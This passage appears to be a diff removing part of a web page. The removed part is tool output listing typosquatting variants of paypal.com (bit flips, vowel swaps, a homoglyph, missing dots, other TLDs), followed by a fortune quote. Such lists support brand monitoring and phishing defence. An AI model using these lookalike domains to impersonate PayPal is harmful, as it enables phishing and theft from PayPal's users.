-Missing Dot            paypalcom.com       ?     com <br/>
-Missing Dot            wwwpaypal.com       ?     com <br/>
-Singular or Pluralise  paypals.com         ?     com <br/>
-Vowel Swap             peypel.com          ?     com <br/>
-Vowel Swap             piypil.com          ?     com <br/>
-Vowel Swap             poypol.com          ?     com <br/>
-Vowel Swap             puypul.com          ?     com <br/>
-Bit Flipping           0aypal.com          ?     com <br/>
-Bit Flipping           pa9pal.com          ?     com <br/>
-Bit Flipping           paipal.com          ?     com <br/>
-Bit Flipping           paqpal.com          ?     com <br/>
-Bit Flipping           paxpal.com          ?     com <br/>
-Bit Flipping           pay0al.com          ?     com <br/>
-Bit Flipping           paypad.com          ?     com <br/>
-Bit Flipping           paypah.com          ?     com <br/>
-Bit Flipping           paypam.com          ?     com <br/>
-Bit Flipping           paypan.com          ?     com <br/>
-Bit Flipping           paypcl.com          ?     com <br/>
-Bit Flipping           paypel.com          ?     com <br/>
-Bit Flipping           paypil.com          ?     com <br/>
-Bit Flipping           paypql.com          ?     com <br/>
-Bit Flipping           payqal.com          ?     com <br/>
-Bit Flipping           payral.com          ?     com <br/>
-Bit Flipping           paytal.com          ?     com <br/>
-Bit Flipping           payxal.com          ?     com <br/>
-Bit Flipping           pcypal.com          ?     com <br/>
-Bit Flipping           peypal.com          ?     com <br/>
-Bit Flipping           piypal.com          ?     com <br/>
-Bit Flipping           pqypal.com          ?     com <br/>
-Bit Flipping           qaypal.com          ?     com <br/>
-Bit Flipping           raypal.com          ?     com <br/>
-Bit Flipping           taypal.com          ?     com <br/>
-Bit Flipping           xaypal.com          ?     com <br/>
-Homoglyphs             paypa1.com          ?     com <br/>
-Wrong TLD              paypal.ca           ?     ca  <br/>
-Wrong TLD              paypal.ch           ?     ch  <br/>
-Wrong TLD              paypal.de           ?     de  <br/>
-Wrong TLD              paypal.edu          ?     edu <br/>
-Wrong TLD              paypal.es           ?     es  <br/>
-Wrong TLD              paypal.fr           ?     fr  <br/>
-Wrong TLD              paypal.it           ?     it  <br/>
-Wrong TLD              paypal.jp           ?     jp  <br/>
-Wrong TLD              paypal.net          ?     net <br/>
-Wrong TLD              paypal.nl           ?     nl  <br/>
-Wrong TLD              paypal.no           ?     no  <br/>
-Wrong TLD              paypal.org          ?     org <br/>
-Wrong TLD              paypal.ru           ?     ru  <br/>
-Wrong TLD              paypal.se           ?     se  <br/>
-Wrong TLD              paypal.us           ?     us  <br/>
-```</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ Everything that you know is wrong, but \
-\ you can be straightened out.           /</p>
 
 <hr />
 
